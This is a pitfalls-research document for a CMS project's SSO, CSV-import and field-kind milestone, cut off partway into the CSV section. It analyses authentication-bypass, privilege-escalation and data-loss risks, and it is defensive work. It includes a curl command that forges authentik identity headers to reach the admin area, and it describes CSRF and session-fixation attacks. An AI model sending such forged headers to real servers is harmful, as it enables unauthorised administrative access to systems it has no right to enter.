# Pitfalls Research — Milestone v1.6

**Domain:** Adding SSO, a table importer, new field kinds and shared field definitions to a mature, security-conscious Go/htmx/SQLite CMS
**Researched:** 2026-09-03
**Confidence:** HIGH for everything grounded in this repository's own code (file and line references throughout); MEDIUM for the external Caddy/authentik advisories, which are recent and were read from the vendor advisories themselves.

---

## How to read this

Every pitfall is specific to **this** codebase. Where a claim rests on a line of
code, that line is named — a planner can open it. Ordered by blast radius:
authentication bypass first, data loss second, silent-wrong-behaviour third,
noise last.

The project's own stated lesson governs the *Warning signs* sections: **the
defects this project shipped were found in the browser, not by the test suite.**
Nearly every pitfall below is invisible to `go test ./...` and visible in two
minutes of clicking. Each one therefore names what to click.

**Blast-radius summary**

| # | Pitfall | Phase | Severity |
|---|---------|-------|----------|
| 1 | The app listens on every interface; the outpost is not the only door | 10 | Critical — total auth bypass |
| 2 | Caddy `forward_auth copy_headers` does not strip the client's own header | 10 | Critical — total auth bypass |
| 3 | No assignment means every website — auto-provisioning grants everything | 10 | Critical — privilege escalation |
| 4 | Group name → role, and the IdP is not a permission store | 10 | Critical — privilege escalation |
| 5 | Email is not a stable identity, and `COLLATE NOCASE` is ASCII-only | 10 | High — account takeover |
| 6 | Compulsory TOTP meets the IdP's MFA — lockout, or a factor silently lost | 10 | High — lockout / weakened auth |
| 7 | The password path disappears and takes break-glass with it | 10 | High — permanent lockout |
| 8 | Logout that does not log out | 10 | High |
| 9 | CSRF and session rotation get quietly dropped in a header-auth flow | 10 | High |
| 10 | Go's `encoding/csv` has no size limit anywhere | 9 | High — remote OOM |
| 11 | Half-written import: no transaction, one INSERT per row | 9 | High — data corruption |
| 12 | `CreatePage` silently renames colliding slugs to `-2`, `-3` | 9 | High — silent data mangling |
| 13 | `values[0]` — the form reader keeps only the first value | 7 | High — silent data loss |
| 14 | The multi-value encoding is decided once, forever, in four places | 7 | High — unmigratable data |
| 15 | Adding `snippet_id` without re-drawing the partial unique index | 8 | High |
| 16 | Adding `snippet_id` without amending the five queries that filter by carrier | 8 | High |
| 17 | A new field kind falls through to a plain text box, silently | 7 | Medium-High |
| 18 | A new kind breaks the CSS-only condition rule and nothing says so | 7 | Medium-High |
| 19 | `bereich` always submits a value; "optional" becomes impossible | 7 | Medium |
| 20 | `code` meets `safeHTML` in an uploaded theme | 7 | Medium |
| 21 | CSV injection belongs at export, not at import | 9 | Medium |
| 22 | Encoding traps: BOM, Latin-1, the Swiss semicolon | 9 | Medium |
| 23 | The importer writes a different multi-value encoding than the renderer reads | 9 ∩ 7 | Medium |
| 24 | New field kinds and snippet fields fall out of the bundle | 7, 8 | Medium |
| 25 | The i18n reformat buries a real change in 4 600 lines | 6 | Medium |
| 26 | The skipping plugin test: the `.wasm` is committed, so staleness is the real silence | 6 | Medium |
| 27 | `MaxFields = 60` is one budget shared by three carriers | 8 | Low-Medium |
| 28 | Every new string in five languages, and the gate that proves it | 6–10 | Low-Medium |

---

# Phase 10 — Authentik forward-auth SSO

This phase is the highest-stakes work in the milestone by a wide margin. Every
other pitfall in this document costs a bug report. These cost the installation.

The single organising principle: **an identity header is a claim, and a claim is
only worth the trust boundary that produced it.** Everything below is a way for
that boundary to leak.

---

## Pitfall 1: The app listens on every interface, so the outpost is not the only door

**What goes wrong:**

`cmd/holzcloud/main.go:425` builds the server as `Addr: ":" + cfg.Port`. An empty
host in Go's `net.Listen` means **every** interface — `0.0.0.0:8080` *and*
`[::]:8080`. `deploy/holzcloud.service` sets `HOLZCLOUD_PORT=8080` and nothing
narrows it. The documented Caddy front door
(`deploy/Caddyfile.example`: `reverse_proxy localhost:8080`) is one of several
ways to reach the process, not the only one.

The moment the app trusts `X-authentik-email`, anybody who can open a TCP
connection to port 8080 is an administrator:

```
curl -H 'X-authentik-email: admin@example.ch' \
     -H 'X-authentik-groups: holzcloud-admins' \
     http://server.lan:8080/admin/
```

The real-world routes to that connection, in descending order of how often they
actually happen:

- **The LAN.** A small server on a home or office network with no host firewall.
  Anyone on the Wi-Fi reaches `:8080`.
- **The IPv6 listener nobody remembered.** A `ufw`/`nftables` rule written for
  IPv4 only leaves `[::]:8080` wide open on a globally routable address. This is
  the classic one: the operator tests `curl http://<v4>:8080`, sees it refused,
  and concludes the port is closed.
- **Docker / Kubernetes network reachability.** `k8s/20-app.yaml` runs the pod on
  the cluster network; every other pod in the namespace can reach it directly by
  Service or Pod IP, going nowhere near the ingress. A `docker-compose` setup with
  `ports: - "8080:8080"` publishes it on the host, bypassing any proxy in the same
  compose file.
- **A second vhost.** The operator adds `beta.example.ch` to the Caddyfile with a
  plain `import holzcloud` and forgets the `forward_auth` block, because the
  snippet in `Caddyfile.example` is `reverse_proxy localhost:8080` and does not
  mention auth. One vhost is protected; the other is not; both serve `/admin`.
- **A health-check port or path.** `mux.HandleFunc("GET /healthz", …)` and
  `/readyz` are registered on the *root* mux (`main.go:670–678`), before the
  admin routes, and are deliberately unauthenticated. That is correct — but if
  the deployment exposes the whole port to a monitoring network "just for
  `/healthz`", it has exposed `/admin` on the same port.

**Why it happens:**

Because forward auth *works* the moment the headers arrive. The developer tests
through Caddy, sees the right name in the corner, and ships. Nothing in the
happy path ever exercises the direct-connection case, and no test can: `go test`
dials an `httptest` server whose `RemoteAddr` is loopback, which is the trusted
case.

**How to avoid — the ordering is the whole answer:**

Four defences, and they are **not** alternatives. Layer them in this order,
because each one covers a different failure of the one before it.

1. **Validate the peer address first, before reading any header.** This is the
   only defence that does not depend on getting a proxy config right, and it must
   run first so that a forged header is never even parsed. The mechanism already
   exists and is already tested: `web.ClientIPResolver.IsTrustedPeer(req)`
   (`internal/web/clientip.go:49`), fed by `cfg.TrustedProxies`
   (`internal/config/config.go:45`, default `127.0.0.1/32,::1/128`).

   Reuse it. Do not write a second trusted-peer check — the project already has
   one, and two implementations of one rule is how the lax one gets used.

   ```go
   // Erste Zeile der Middleware, vor jedem Header-Zugriff.
   if !h.clientIP.IsTrustedPeer(r) {
       // Nicht "ignoriere die Kopfzeilen und mach weiter": eine Anfrage,
       // die Identitätskopfzeilen mitbringt und nicht durch den Vorposten
       // kam, ist ein Angriffsversuch und gehört ins Protokoll.
       ...
   }
   ```

   **The nuance that matters:** what should a request from an *untrusted* peer
   that carries no identity header do? It must fall through to the ordinary
   password login, not be refused — otherwise the break-glass path (Pitfall 7)
   dies with it. So: *untrusted peer → strip every identity header and continue
   as anonymous.* Trusted peer → believe the headers. Never "untrusted peer →
   403", and never "no headers → 403".

2. **Strip inbound copies of every identity header, unconditionally, at the very
   top of the chain** — in the app, not only in Caddy. Even on a trusted peer.
   Rationale: Pitfall 2 shows the proxy demonstrably fails to do this, and
   `r.Header.Del(...)` for a fixed list of names is three lines that cannot fail.
   Delete first, then read what the outpost set.

   Delete the canonical name **and its underscore alias** (`X_authentik_email`).
   Go's `http.Header` canonicalises `-` but not `_`, so `X_authentik_email` and
   `X-authentik-email` are two distinct map keys; Caddy's own advisory
   GHSA-f59h-q822-g45g is exactly this class of alias bypass.

3. **A shared secret between outpost and app**, checked in constant time. The
   outpost is configured to send one extra header (authentik supports custom
   headers on a proxy provider); the app requires it, from an environment
   variable, e.g. `HOLZCLOUD_FORWARD_AUTH_SECRET`. This is the defence that
   survives a peer-check mistake: even if the app is reachable at `:8080` from
   the LAN, the attacker also needs the secret.

   Use `crypto/subtle.ConstantTimeCompare`. Keep the secret in the environment
   and out of the database, exactly as `PayrexxSecret` is (`config.go` comment:
   "the database is what gets copied into every backup").

4. **Optionally, a signed assertion.** authentik's outpost can pass
   `X-Authentik-Jwt` alongside `X-Authentik-Meta-Jwks`. Verifying it is the
   strongest defence — it makes the header self-authenticating and independent of
   the network path.

   **Recommend against it for v1.6, and say why in the code.** It needs a JWT
   library (outside "stdlib-first"), and JWKS retrieval is a runtime call to
   another service — which is not "third party" in the CLAUDE.md sense, but is a
   runtime dependency the rest of this program does not have, and a failure mode
   (JWKS unreachable → nobody can sign in) with no precedent here. Defences 1–3
   are enough for the stated deployment. Record the decision so it is not
   relitigated.

   **Do not** implement a half version: parsing a JWT without verifying its
   signature is strictly worse than not having it, because it looks like a
   defence.

**Warning signs:**

- `ss -ltnp | grep 8080` shows `0.0.0.0:8080` or `*:8080` rather than
  `127.0.0.1:8080`.
- From a second machine on the network: `curl -H 'X-authentik-email: …'
  http://<server>:8080/admin/` returns a dashboard instead of a login form.
  **This one command is the acceptance test for the whole phase.** Run it over
  IPv4 *and* IPv6.
- The log has no line for "identity header from an untrusted peer". If that
  event cannot appear in the log, nobody will ever notice it happening.
- `HOLZCLOUD_TRUSTED_PROXIES` was widened to something like `10.0.0.0/8` or
  `0.0.0.0/0` "to make it work in Docker". That is the same as switching the
  check off — and it also breaks the login throttle, which keys on the same
  resolver.

**Phase to address:** Phase 10, and it is the first task of the phase — the
middleware's shape follows from this ordering. Add `HOLZCLOUD_BIND` (default
`127.0.0.1`) alongside `HOLZCLOUD_PORT` so the default deployment is not
reachable off-host at all, and update `deploy/holzcloud.service` and
`deploy/DEPLOY.md` in the same commit.

---

## Pitfall 2: Caddy's `forward_auth copy_headers` does not strip the client's own header

**What goes wrong:**

This is not a hypothetical. Caddy advisory **GHSA-7r4p-vjf4-gxv4 /
CVE-2026-30851**: `forward_auth … { copy_headers X-Foo }` generates a
*conditional* header-set that only fires when the auth service returns `X-Foo`.
It generates **no delete** for the client's inbound `X-Foo`. When the outpost
answers `200 OK` without that header — which happens for an anonymous/public
route, or for a user with no email set, or for any header authentik chose not to
emit — the client's own value passes through to the backend **verbatim**.

Affected: Caddy **v2.10.0 through v2.11.1**. Fixed in **v2.11.2**. The regression
came from PR #6608 in November 2024, so it has been latent for well over a year
and is in whatever Caddy a typical operator has installed from the stable apt
repo.

A companion advisory, **GHSA-f59h-q822-g45g / CVE-2026-52845**, is the underscore
variant: where FastCGI normalises `-` to `_`, a client-sent `X_Authentik_Email`
survives the delete step and lands in the same variable. Not directly applicable
to a Go `reverse_proxy` backend, but it is the reason the app-side strip
(Pitfall 1, defence 2) must cover underscore aliases too.

**Why it happens:**

Because `copy_headers` reads like it means "these headers come from the auth
service", and everyone assumes a proxy that sets a header also clears the
inbound one. It usually does. Here it does not, in one specific branch.

Compounding it: authentik's own documentation says the outpost "removes any
`X-authentik-*` headers sent by upstream or downstream". That is true of the
**outpost's** handling — it does not describe what Caddy forwards to *your*
backend on the path that skips the outpost's response headers.

**How to avoid:**

Ship a corrected `deploy/Caddyfile.example`. The correct shape:

```caddyfile
(holzcloud-sso) {
	# UNBEDINGT vor forward_auth: Caddy löscht die vom Client mitgebrachte
	# Kopfzeile nicht von selbst, wenn der Vorposten sie nicht zurückgibt.
	# Siehe GHSA-7r4p-vjf4-gxv4. Jede Kopfzeile aus copy_headers braucht
	# hier ihre eigene Zeile.
	request_header -X-Authentik-Username
	request_header -X-Authentik-Groups
	request_header -X-Authentik-Email
	request_header -X-Authentik-Name
	request_header -X-Authentik-Uid
	request_header -X-Authentik-Jwt
	request_header -X-Authentik-Entitlements
	request_header -X-Authentik-Meta-Jwks
	request_header -X-Authentik-Meta-Outpost
	request_header -X-Authentik-Meta-Provider
	request_header -X-Authentik-Meta-App
	request_header -X-Authentik-Meta-Version
	request_header -X-Holzcloud-Forward-Secret

	# Der Vorposten muss unter dieser Adresse öffentlich erreichbar sein.
	handle /outpost.goauthentik.io/* {
		reverse_proxy http://outpost.internal:9000
	}

	forward_auth http://outpost.internal:9000 {
		uri /outpost.goauthentik.io/auth/caddy
		copy_headers X-Authentik-Username X-Authentik-Groups X-Authentik-Email X-Authentik-Name X-Authentik-Uid X-Authentik-Entitlements
		trusted_proxies private_ranges
	}

	reverse_proxy localhost:8080
}
```

Three things about that snippet:

- **Header capitalisation matters** to authentik's copy_headers matching; the
  docs say so explicitly. Go's `http.Header.Get` is case-insensitive, so the app
  side does not care — but Caddy's placeholder lookup does.
- `/outpost.goauthentik.io/*` must be routed to the outpost and must be publicly
  reachable, or the sign-in redirect and the sign-out URL both 404.
- The shared secret is *also* stripped inbound. A client that could set
  `X-Holzcloud-Forward-Secret` itself would defeat defence 3.

**The classic misconfiguration**, in the order people commit it:

1. `copy_headers` without the matching `request_header -…` lines — the CVE.
2. Adding a second vhost with `import holzcloud` (the old snippet) instead of
   `import holzcloud-sso`. One domain protected, one not, same backend.
3. Putting `forward_auth` inside a `handle /admin/*` block only. Then the
   *public* site is unauthenticated (correct) but so is anything the admin mux
   later mounts outside `/admin/` — e.g. `/ai` (`main.go:696`).
4. Pinning Caddy from a distro package that is still on 2.10.x and never
   upgrading. `DEPLOY.md` must state a minimum Caddy version of **2.11.2**.

**The correct posture regardless of Caddy version:** the app strips the headers
itself on entry (Pitfall 1, defence 2). Then a wrong Caddy config is a
misconfiguration, not a bypass. Do not make the app's safety depend on a
correctly-written Caddyfile on someone else's server.

**Warning signs:**

- `caddy version` reports anything below `v2.11.2`.
- A request through Caddy carrying its own `X-Authentik-Email: someone@else`
  arrives at the app with that value rather than the signed-in user's.
- The app log shows an identity for a user who is not signed in at the IdP.

**Phase to address:** Phase 10 — as a documentation-and-example task with its
own commit, plus the app-side strip. `deploy/DEPLOY.md` gains an SSO section.

---

## Pitfall 3: "No assignment means every website" — auto-provisioning grants everything

**What goes wrong:**

`internal/admin/handler.go:156–174`, `NewWebsiteAccessLookup`, ends with:

```go
return assigned == 0 || mine > 0
```

The comment above it is explicit and correct for the feature it was written for:
*"No assignment means every website … that is what keeps this invisible for an
installation that never uses it."* For manual account creation this is exactly
right — an installation that never touched per-user rights behaves as it always
did.

Under auto-provisioning it inverts. A freshly created SSO account has **zero**
rows in `user_websites` by construction. So the very first stranger who
authenticates at the IdP and is auto-created gets **editor access to every
website in the installation** — pages, menus, media, terms, snippets, orders.

This is the single most likely way this milestone ships a real vulnerability,
because every part of it looks correct in isolation.

**Why it happens:**

Two features written eighteen months apart, each with a defensible default, that
compose into the wrong answer. Nobody rereads `handler.go:173` while writing an
auto-provisioning function in a different package.

**How to avoid:**

Do not change `NewWebsiteAccessLookup` — its default is right for the case it
serves, and changing it would silently lock out every existing editor on every
existing installation. Instead, make an auto-provisioned account **explicitly
scoped at creation**:

- Auto-provisioning writes at least one `user_websites` row. If the operator has
  not configured a mapping, write **none of the websites** — which under the
  current lookup is impossible to express. So the honest fix is a third state:
  add an explicit "no websites" marker, or refuse to auto-provision at all
  until the operator has chosen a default website.
- **Preferred, and simplest:** auto-provisioning is **off by default**
  (`HOLZCLOUD_SSO_AUTOCREATE=false`). With it off, an unknown identity is
  refused with a message naming the address, and an administrator invites them
  the way accounts are created today. That is one screen of work for the
  operator and it removes this entire class of bug from the default install.
- If it is on, it takes an explicit default: `HOLZCLOUD_SSO_DEFAULT_WEBSITE=<id>`
  and `HOLZCLOUD_SSO_DEFAULT_ROLE=editor`. Refuse to start if autocreate is on
  and no default website is named — the project already refuses to start on a
  half-configured Payrexx pair, so the precedent exists.

**Warning signs:**

- A new SSO user's website switcher lists websites they were never given.
  `admin.NewNavWebsiteList` (`main.go:955`) shows only what the person may enter,
  so the switcher *is* the test: sign in as a freshly provisioned identity and
  count the entries.
- `SELECT COUNT(*) FROM user_websites WHERE user_id = <new user>` returns 0 for a
  user who can reach `/admin/websites/2/pages`.

**Phase to address:** Phase 10. Write the test as an `internal/admin` handler
test asserting a provisioned user with no assignment is refused website 2 —
`internal/admin` is at 14.7 % coverage and this is exactly the "authorisation or
website-scoping mistake caught only by a manual browser pass" that
`CONCERNS.md` names.

---

## Pitfall 4: Privilege escalation through a group name

**What goes wrong:**

The obvious mapping is `X-authentik-groups: holzcloud-admins` → `role = 'admin'`.
Three ways that goes wrong:

- **The header is a list with an operator-chosen delimiter.** authentik joins
  groups with `|` by default, but it is configurable, and group names may contain
  almost anything. Naive `strings.Contains(groups, "holzcloud-admins")` matches a
  group literally named `not-holzcloud-admins` or `holzcloud-admins-readonly`.
  Split, then compare whole elements, case-sensitively.
- **Anyone who can create a group at the IdP can create an admin here.** In many
  authentik installations, group self-service or a directory sync means group
  membership is not as tightly held as the CMS admin role. The CMS's admin role
  can change every password, upload a template, and reach every site
  (`auth.MustHaveSecondFactor`'s own comment says so).
- **Demotion never happens.** The escalation path is tested; the de-escalation
  path is not. A user removed from the admin group at the IdP keeps `role =
  'admin'` locally forever, because the provisioning code only ever runs its
  role logic on *create*.

**How to avoid:**

- Map groups on **every request**, not only on create — and map **down** as well
  as up. `auth.RequireAuth` already re-reads the role from the database on every
  request (`middleware.go:47–59`) precisely so a role change takes effect at
  once; the SSO path should feed that same mechanism rather than sitting beside
  it.
- Split the header properly. Make the delimiter configurable and default to `|`,
  and compare exact elements.
- Make the admin group name an explicit operator setting
  (`HOLZCLOUD_SSO_ADMIN_GROUP`) with **no default**. An unset value means no SSO
  identity is ever an administrator — safe, and it forces a deliberate act.
- Never let an SSO login *demote* the local break-glass administrator (Pitfall 7).
  Guard: an account flagged as local-only is never touched by group sync.
- **Do not** grant `role = 'admin'` on the basis of the header alone without a
  local record that this identity is allowed to be an admin. Belt and braces: the
  group grants admin only to an account an administrator has already marked as
  eligible.

**Warning signs:**

- `SELECT email, role FROM users WHERE role = 'admin'` grows without anyone
  having created an administrator.
- The activity log (`internal/activity`) has no entry for a role change, because
  the SSO path writes the role without logging. Every role change must be logged
  with the same `activity.Entry` shape as a manual one, or the log stops being an
  answer to "who made this person an admin".

**Phase to address:** Phase 10.

---

## Pitfall 5: Email is not a stable identity, and `COLLATE NOCASE` is ASCII-only

**What goes wrong:**

`users.email` is `TEXT NOT NULL UNIQUE COLLATE NOCASE`
(`internal/db/migrations/00001_initial.sql:5`). That is better than most
schemas — but SQLite's `NOCASE` folds **only ASCII A–Z**. Consequences:

- **`Müller@example.ch` and `müller@example.ch` are two different rows.** The
  UNIQUE constraint does not stop the second one. An SSO login that matches on
  email will silently create a *second* account for the same person, with the
  same group memberships, and therefore a second admin. It will also mean their
  work appears under two names in the activity log.
- **Unicode confusables.** `аdmin@example.ch` with a Cyrillic `а` (U+0430) is a
  different string from `admin@example.ch` and passes UNIQUE cleanly. If the
  operator's IdP allows a user to set their own email — or if a second, less
  trusted directory is federated into authentik — that is an account that *looks*
  like the administrator in every list in the admin UI.
- **Email change at the IdP is account takeover.** If email is the join key and
  a user can change their email at the IdP to `boss@example.ch`, the next login
  matches the boss's local account and inherits its role, its website
  assignments, and its history. This is the single most common forward-auth
  design flaw.
- **A user deleted at the IdP stays active locally.** Forward auth is
  pull-only: the app learns nothing when an account is disabled. The local row
  remains, and if the local password path still works (Pitfall 7), the ex-employee
  can still sign in with it.
- **Two identities collide on one email.** Two directories federated into
  authentik, both with `info@example.ch`. Whichever signs in second silently
  becomes the first.

**How to avoid:**

- **Join on `X-authentik-uid`, not on email.** The uid is authentik's stable
  internal identifier; it survives a name change and an email change. Add a
  nullable `sso_subject TEXT UNIQUE` column to `users`, and match on that.
  Email becomes a *display* attribute that is updated from the header, never a
  key.
- The **first** match of an SSO identity to an existing local account (the
  linking step) is the dangerous one and must not be automatic. Either an
  administrator links them in the UI — `HandleUserLink` already exists at
  `main.go:868` — or linking happens only when the email matches *and* the
  account has no `sso_subject` yet *and* the operator has enabled linking.
- **Normalise before comparing, for the fallback path.** `strings.ToLower` is
  ASCII-ish for the local part; use `golang.org/x/text/cases` folding, or at
  minimum reject any email containing a non-ASCII character in the SSO join path
  and require a manual link. That is a two-line guard that closes the confusables
  hole entirely, and it is honest about the limit.
- **Deprovisioning:** accept that forward auth cannot push. Give the operator a
  visible list — "these accounts were created by SSO and have not signed in for
  N days" — on the users screen, plus the existing session-revoke button
  (`main.go:869`). Do not pretend deletion is automatic.

**Warning signs:**

- Two rows in `users` whose emails differ only by case or by one glyph.
- The activity log shows the same person under two `actor_email` values.
- An account with `sso_subject` set that also has a working password hash and
  was never explicitly linked.

**Phase to address:** Phase 10. The `sso_subject` column is a plain
`ALTER TABLE … ADD COLUMN` plus a partial unique index (`WHERE sso_subject IS
NOT NULL`) — the same two-line pattern as migration 00038, and no table rebuild.

---

## Pitfall 6: Compulsory TOTP meets the IdP's second factor

**What goes wrong:**

`auth.MustHaveSecondFactor(role)` returns true for every administrator, and
`auth.RequireSecondFactor` redirects an administrator without a confirmed
authenticator to `/admin/2fa/einrichten` before they can reach anything else
(`internal/auth/twofactor.go:41–76`). It runs **inside** `RequireAuth`
(`main.go:968`).

An SSO administrator therefore lands on the TOTP setup screen, every time,
forever — because setting up TOTP for an account whose password nobody knows is
at best confusing and at worst impossible depending on how the setup flow
confirms identity.

Each of the three possible policies has a distinct failure mode:

| Choice | Failure mode |
|--------|--------------|
| **Skip the local gate for SSO sessions** | The installation's stated guarantee — "compulsory second factor for administrative accounts", written into `SECURITY.md` — becomes conditional on an IdP nobody here can audit. If the operator's authentik has MFA off for that flow, an admin now has one factor and the CMS says two. |
| **Keep both** | Two codes at every sign-in. Users will disable one, and the one they disable is the local one, arriving back at the row above by a longer route. Also: the TOTP setup screen is unreachable for an SSO-only account, so the admin is locked on one screen. |
| **Per-user** | The most correct and the most work; the risk is a default. If the default is "local factor not required", every account silently starts at one factor. |

**How to avoid:**

**Recommended: skip the local gate for SSO sessions, but only when the operator
has asserted the IdP enforces MFA — and make that assertion explicit and
visible.**

- `HOLZCLOUD_SSO_MFA=enforced|unknown`, defaulting to `unknown`. With `unknown`,
  the local gate stays on and an SSO administrator must still set up TOTP; the
  setup screen must therefore be reachable without a password (it currently sits
  behind `requireAuth`, which an SSO session satisfies — verify this in the
  browser, it is not obvious).
- With `enforced`, mark the session (`SessionKeyAuthSource = "sso"`) and let
  `RequireSecondFactor` pass. Do **not** infer this from the presence of a header;
  the operator states it.
- Surface it in the admin: the account screen and the users list say "second
  factor: through the sign-in service" rather than showing an empty TOTP state.
  An admin who cannot see which factor protects them will not notice when it
  disappears.
- Update `SECURITY.md`'s claim ("Passwörter mit Argon2id, zweiter Faktor für
  Verwaltungskonten zwingend") in the same commit. A security document that has
  drifted from the code is worse than none.

**The lockout risk, concretely:** the IdP is down, or the operator's authentik
upgrade broke the flow, and every administrator is an SSO administrator. There is
no way in. This is why Pitfall 7 is not optional.

**What break-glass must survive:** at least one local administrator account with
a password and a local TOTP, reachable at `/admin/login` on a path that does
**not** go through the outpost, with a documented way to reach it — and the
existing shell-only recovery door in `cmd/holzcloud/cli.go:392+` must keep
working for that account.

**Warning signs:**

- An SSO administrator sees `/admin/2fa/einrichten` and cannot complete it.
- `/admin/2fa/einrichten` 500s or redirects in a loop for an account whose
  `password` column holds a placeholder.
- Nobody has tried signing in with the outpost stopped.

**Phase to address:** Phase 10. Add a UAT step: **stop the outpost and sign in**.

---

## Pitfall 7: The password path disappears, and takes break-glass with it

**What goes wrong:**

The tempting simplification, once SSO works, is to remove or hide
`/admin/login`. Then:

- The IdP being unavailable means the CMS is unadministrable. Not degraded —
  unadministrable. There is no second door.
- A misconfigured group mapping that demotes every administrator is
  unrecoverable through the web.
- Every installation that never deploys an IdP — which is most of them, and is
  the documented deployment in `deploy/DEPLOY.md` — breaks outright if the SSO
  code path is not cleanly optional.

There is a second, quieter failure: several existing features **require a
password to be re-entered**, and an SSO account has none.

- `auth.RequireFreshPassword` (`internal/auth/elevate.go:57`) guards website
  deletion, user deletion, AI key creation and plugin removal
  (`main.go:741, 867, 888, 894`). It redirects to `/admin/bestaetigen`, which
  asks for the password. An SSO account whose stored `password` is a placeholder
  can never satisfy it — those four buttons become permanently unusable, with a
  redirect loop as the symptom.
- Password change and session-invalidation-after-password-change
  (`auth.DestroyUserSessions`) have no meaning for an SSO account.

**How to avoid:**

- **`/admin/login` never goes away.** SSO is an *additional* front door, exactly
  as the project frames Payrexx as "an addition, not a requirement". An
  installation with no `HOLZCLOUD_SSO_*` configured must behave byte-for-byte as
  it does today — that is the acceptance criterion, and it is testable: run the
  full existing test suite with SSO unconfigured and require it green, and run
  one browser pass on an SSO-less install.
- **Break-glass is a named, documented account.** `deploy/DEPLOY.md` gains a
  section: create one local administrator with a password and TOTP before
  enabling SSO; do not federate it; store its recovery codes offline. The CLI
  recovery door (`cli.go:392+`) is the last resort below that.
- **`RequireFreshPassword` needs a second satisfier for SSO sessions.** The
  honest options: (a) re-run the outpost's re-authentication (authentik supports
  forcing re-auth), or (b) accept the local TOTP code instead of the password,
  or (c) for an SSO session, require the local break-glass admin to perform
  destructive actions. Option (b) is the smallest change that keeps the feature's
  intent — "the laptop left open in a shared office for two minutes" — and reuses
  code that already exists.

  Whatever is chosen: **the four `requireFresh` routes must be clicked in a
  browser as an SSO administrator.** A redirect loop there is invisible to the
  test suite.
- The stored `password` for an SSO-only account should be a value that can never
  verify. An empty string already works — `auth.VerifyPassword`
  (`password.go:74–77`) rejects anything that is not six `$`-separated PHC parts
  — but write it deliberately and test it, rather than relying on an accident.
  Do **not** store a hash of a random string: that is a credential that exists.

**Warning signs:**

- `/admin/login` returns 404 or redirects to the IdP unconditionally.
- Pressing "Website löschen" as an SSO admin bounces between
  `/admin/bestaetigen` and the website page.
- The test suite is green but nobody ran it with `HOLZCLOUD_SSO_*` unset.

**Phase to address:** Phase 10.

---

## Pitfall 8: Logout that does not log out

**What goes wrong:**

`HandleLogout` destroys the local SCS session. The browser still holds the
authentik session cookie. The next request to `/admin/` goes to the outpost, the
outpost says "yes, still signed in", the headers arrive, and the app creates a
fresh local session. The person is signed back in **instantly and silently** —
often before they have finished reading the "you have been signed out" flash.

On a shared machine this is the whole point of logout, and it is gone.

authentik's own issue tracker (#5427, #3471, #2023) shows this confuses people
repeatedly, so it is not a case of one team getting it wrong.

**How to avoid:**

- After destroying the local session, redirect to
  `https://<this-host>/outpost.goauthentik.io/sign_out`. Since authentik 2023.2
  that terminates all of the user's sessions **within that outpost** — not other
  outposts, not other protocols, and that limit must be stated in the UI text.
- The redirect target must be built from the request's own host, never from a
  header or a query parameter. The project already has the right instinct in
  `auth.backTo` (`elevate.go:75`: "an address from a header that ends up in a
  redirect is how an open redirect is built") and `auth.SafeReturn` — reuse them.
- `/outpost.goauthentik.io/*` must be routed to the outpost in the Caddyfile, or
  the sign-out link is a 404 and the user concludes logout is broken.
- **htmx:** logout is a POST from a button. If the response is a redirect, htmx
  follows it via XHR and the browser address bar never changes — the sign-out
  page renders inside the admin layout, or not at all. Use `HX-Redirect`, as the
  project's own convention requires ("Use `HX-Redirect` (not 302) for
  post-mutation navigation from htmx requests"). And because the handler now
  branches on the `HX-Request` header, it must set `Vary: HX-Request`.
- **CSP:** `form-action 'self'` in `adminCSP` (`internal/web/headers.go:17`)
  applies to form submissions and, in some browsers, to redirects following one.
  The sign-out URL is on the *same* origin here — good — but if the operator runs
  the outpost on a separate hostname, that breaks silently in Safari, exactly as
  the `PaymentFormAction` comment documents for Payrexx. Prefer the same-host
  `/outpost.goauthentik.io/` route; if a separate host is ever supported, the
  policy must name it.
- If SSO is not configured, logout behaves exactly as today.

**Warning signs:**

- Sign out, press Back, press Reload: you are signed in.
- The sign-out link 404s.
- Logout works in a full-page load and does nothing when clicked in the admin UI
  (the htmx case).

**Phase to address:** Phase 10.

---

## Pitfall 9: CSRF and session fixation get quietly dropped

**What goes wrong:**

Two reasonable-sounding but wrong conclusions:

- *"The proxy authenticates every request, so CSRF is unnecessary."* **False, and
  dangerously so.** Forward auth is cookie-based at the IdP: the browser sends
  the authentik cookie automatically on a cross-site request just as it sends any
  other cookie. A malicious page can POST to
  `https://cms.example.ch/admin/websites/2/delete`, the browser attaches the
  authentik session cookie, the outpost says yes, and the app deletes the
  website. Forward auth makes CSRF **more** relevant, not less, because it adds
  a second ambient credential.

  CSRF stays on every state-changing route. `gorilla/csrf` is applied to the
  whole `/admin/` tree (`main.go:968`) — keep it there, and do not add an
  exemption "because the outpost already checked".

  And the project's own htmx convention matters here: the token travels in the
  `X-CSRF-Token` header via `hx-headers` on `<body>`, because **htmx AJAX does
  not send hidden form fields**. Any new SSO screen must carry it the same way.

- *"There is no login handler any more, so there is nothing to rotate."*
  **False.** The moment a header-authenticated request is turned into a local
  session with a `user_id`, that is a login, and the token must be rotated —
  `sm.RenewToken(r.Context())` — **before** any value is written. `HandleLogin`
  already does this correctly (`internal/admin/login.go:78–81`) with the comment
  "Rotate session ID BEFORE setting values (prevents session fixation)". Copy
  that ordering exactly.

  The concrete attack: an attacker on a shared or public network fixes a session
  cookie in the victim's browser (a subdomain, an XSS elsewhere on the origin, a
  bad Wi-Fi captive portal). The victim then authenticates through the IdP. If
  the token is not rotated, the attacker's known token is now an authenticated
  admin session.

- A third, subtler one: **the session must be rebound if the identity changes.**
  If a request arrives with headers naming a different person than the session's
  `user_id`, the session must be destroyed and re-established, not silently kept.
  Otherwise a shared kiosk where two people sign in one after the other leaves
  the second person operating as the first.

**How to avoid:**

- Keep `csrfMiddleware` where it is in the chain and add nothing to its
  exemptions.
- Where the SSO middleware sits in the chain matters:
  `AdminHeaders → csrf → setupGuard → **ssoIdentity** → requireAuth →
  requireSecondFactor → withLang → requireWebsite → withNav`.
  It goes **after** CSRF (so CSRF still guards it), **before** `requireAuth` (so
  `requireAuth` finds a user), and **inside** `sm.LoadAndSave` (which is applied
  at `main.go:1066`, outside everything) so a session exists to write to.
- `RenewToken` on every transition from "no local session" to "local session",
  and on every identity change.
- Assert both in a handler test — they are cheap to test and expensive to lose.

**Warning signs:**

- A POST to an admin route from an off-site HTML page succeeds.
- The `holzcloud_session` cookie value is unchanged across an SSO sign-in.
- Signing in as user B on a browser that had user A's session leaves A's
  `user_id` in the session.

**Phase to address:** Phase 10.

---

# Phase 9 — CSV import

The governing fact: **`encoding/csv` in the standard library has no size limit
of any kind.** No maximum field length, no maximum record length, no maximum
record count. A quoted field is buffered whole. The documentation confirms this
by omission — the Reader's only knobs are `Comma`, `Comment`,
